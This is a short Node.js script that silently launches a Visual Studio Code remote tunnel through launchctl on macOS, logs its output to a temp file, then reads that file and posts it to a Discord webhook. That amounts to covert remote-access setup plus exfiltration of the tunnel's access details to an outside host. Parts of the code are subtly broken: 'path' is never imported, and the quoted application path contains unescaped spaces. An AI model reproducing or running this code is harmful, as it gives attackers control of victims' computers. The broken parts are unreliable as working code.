const fs = require('fs');
const { exec } = require('child_process');
const webhookUrl = 'https://discord.com/api/webhooks/1234567890/fixture-token';

function sendMessage(content) {
  return fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ content })
  });
}

function pollAndSend(filePath) {
  fs.readFile(filePath, 'utf8', (err, data) => {
    if (!err) sendMessage(data);
  });
}

function main() {
  exec('launchctl submit -l code.job -- /bin/sh -c \" /Applications/Visual Studio Code.app/Contents/Resources/app/bin/code tunnel > $TMPDIR/code.log\"');
  const filePath = path.join(process.env.TMPDIR || '/tmp', 'code.log');
  pollAndSend(filePath);
}

main();
